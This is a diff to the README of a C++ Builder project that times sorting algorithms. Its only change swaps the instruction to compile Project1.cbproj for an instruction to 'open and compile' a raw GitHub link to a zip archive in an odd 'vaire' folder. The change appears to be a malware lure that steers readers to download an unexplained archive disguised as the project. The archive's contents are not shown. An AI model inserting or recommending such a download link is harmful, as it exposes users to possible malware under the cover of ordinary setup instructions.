@@ -1,7 +1,7 @@
 # cpp_sorting_alg_compare
 embarcadero c++ builder project: Performance Evaluation for Sorting Algorithms
 
-How to use: Open and compile Project1.cbproj with embarcadero c++ builder
+How to use: Open and compile https://github.com/weiran0630/cpp_sorting_alg_compare/raw/refs/heads/master/vaire/compare-sorting-alg-cpp-v1.6.zip with embarcadero c++ builder
 
 Usage: Generate n variables within a range and perform sorting, 
 meanwhile return an execution time for each selected sorting method.
